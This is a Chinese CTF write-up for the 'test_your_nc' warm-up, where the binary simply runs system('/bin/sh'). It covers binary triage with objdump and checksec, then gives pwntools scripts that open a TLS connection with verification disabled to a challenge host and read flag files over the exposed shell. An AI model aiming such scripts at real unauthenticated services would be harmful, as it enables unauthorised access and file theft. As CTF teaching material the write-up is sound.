# Speedrun：test_your_nc

> 题型：网络交互 / 白给 Shell  
> 目标：TLS 连上服务，直接执行 `ls`、`cat flag*`  
> 核心：不要把它当 PWN；二进制本身只执行 `system("/bin/sh")`

> ⚠️ **复现提示（2026-11-23 审计）**：EXP 里的 `HOST` 是 2019 年 CTF² 的临时靶机
> （`*.tcp-ctf2.dasctf.com`），早已下线，脚本也没有 `LOCAL` 分支。
> 本地复现按下文「本地验证」把 `remote(...)` 换成 `process('./test_your_nc')`；
> 二进制已归档在同目录，可直接跑。

---

## 0. 一句话结论

`main` 里只有一句：

```c
system("/bin/sh");
```

没有输入，没有 `gets`，没有偏移。  
PIE 是干扰项；这题唯一要解决的是 **CTF² 的 TLS 连接**，连上就是 shell。

---

## 1. 30 秒定性质

在仓库根目录、已激活 `.venv` 的前提下：

```bash
cd '/home/yfhd5/Pwn_Writeups/network_interaction_free_shell'

file test_your_nc
checksec --file=test_your_nc
objdump -d -M intel test_your_nc | sed -n '/<main>:/,/^$/p'
objdump -s -j .rodata test_your_nc
```

关键输出：

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
PIE enabled
NX enabled
No canary found

0000000000001135 <main>:
    1139: lea    rdi,[rip+0xec4]        # 2004 <_IO_stdin_used+0x4>
    1140: call   1030 <system@plt>

Contents of section .rodata:
 2000 01000200 2f62696e 2f736800           ..../bin/sh.
```

读法：

| 观察 | 结论 |
| --- | --- |
| `main` 直接 `system("/bin/sh")` | 程序正常逻辑就是给 shell |
| PIE enabled | 与本题无关，不需要地址、不需要 leak |
| No canary / NX | 也不需要，因为没有栈溢出点 |
| `.rodata` 有 `/bin/sh` | 确认参数就是 `/bin/sh` |

本地验证（不连远程）：

```bash
printf 'echo SHELL_OK; id; exit\n' | ./test_your_nc
```

应看到：

```text
SHELL_OK
uid=1000(yfhd5) gid=1000(yfhd5) ...
```

---

## 2. 关键逆向

`main` 完整逻辑：

```asm
0000000000001135 <main>:
    1135: push   rbp
    1136: mov    rbp,rsp
    1139: lea    rdi,[rip+0xec4]   # 2004 "/bin/sh"
    1140: call   1030 <system@plt>
    1145: mov    eax,0x0
    114a: pop    rbp
    114b: ret
```

等价 C：

```c
int main(void) {
    system("/bin/sh");
    return 0;
}
```

所以这题没有“利用布局”。  
真正的“漏洞”是服务端把交互式 shell 直接暴露给未认证连接。

---

## 3. 利用方式

### 3.1 远程交互

```python
from pwn import *
import ssl

HOST = "9347582521a0e3a4936fc5e1.tcp-ctf2.dasctf.com"  # 换成当前靶机
PORT = 9999

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

p = remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)
p.interactive()
```

进入交互后：

```text
ls -la
cat flag*
cat /flag*
```

### 3.2 自动化拿 flag

```python
from pwn import *
import ssl, re

HOST = "9347582521a0e3a4936fc5e1.tcp-ctf2.dasctf.com"
PORT = 9999

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

p = remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

p.sendline(b"ls -la")
p.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null")
p.sendline(b"exit")

out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
print(out)

flags = re.findall(r"(?:CTF2|flag|DASCTF)\{[^}]+\}", out)
if flags:
    print(f"[🎉] {flags[0]}")
```

---

## 4. 完整 exp

```python
from pwn import *
import ssl, re

HOST = "9347582521a0e3a4936fc5e1.tcp-ctf2.dasctf.com"
PORT = 9999

def exploit():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    p = remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    p.sendline(b"ls -la")
    p.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null")
    p.sendline(b"exit")

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:CTF2|flag|DASCTF)\{[^}]+\}", out)
    if flags:
        print(f"[🎉] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] Flag not found, try p.interactive() manually")

if __name__ == "__main__":
    exploit()
```

---

## 5. 交互坑

1. **CTF² 强制 TLS**
   普通 `nc host 9999` 或 `remote(HOST, PORT)` 可能直接 `EOFError`。  
   必须 `ssl=True`，并关闭证书校验。

2. **`sni` 最好带上**
   有些网关按 SNI 分流；`remote(..., ssl=True, sni=HOST)` 最稳。

3. **不要等提示符**
   这题连上可能没有 banner，直接发命令即可。

4. **flag 路径未知**
   先 `ls -la`，再试：
   ```bash
   cat flag
   cat flag.txt
   cat /flag
   cat /flag.txt
   cat flag*
   ```

5. **PIE 是干扰项**
   这题没有内存破坏，不需要算基址、不需要 ROP。

6. **如果平台不是 TLS**
   去掉 `ssl=True, ssl_context=ctx, sni=HOST`，改用普通 `remote(HOST, PORT)`。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `objdump main`：发现 `system("/bin/sh")` |
| 0:20–0:35 | 判断 PIE 无关，确定是网络交互题 |
| 0:35–0:50 | 配 TLS context，`remote(..., ssl=True)` |
| 0:50–1:10 | `ls`、`cat flag*`、`cat /flag*` |
| 1:10–1:30 | 正则提取 flag，收工 |

---

## 7. 题型识别卡

看到下面组合，直接判定“白给 shell”：

```text
题目名 test_your_nc
+ main 里只有 system("/bin/sh")
+ 没有 gets/read 输入
+ 远程要求 TLS
= 连上就是 shell，不需要 PWN
```

一句话：**先 `objdump main`，看到 `system("/bin/sh")` 就不要再逆了，直接连。**
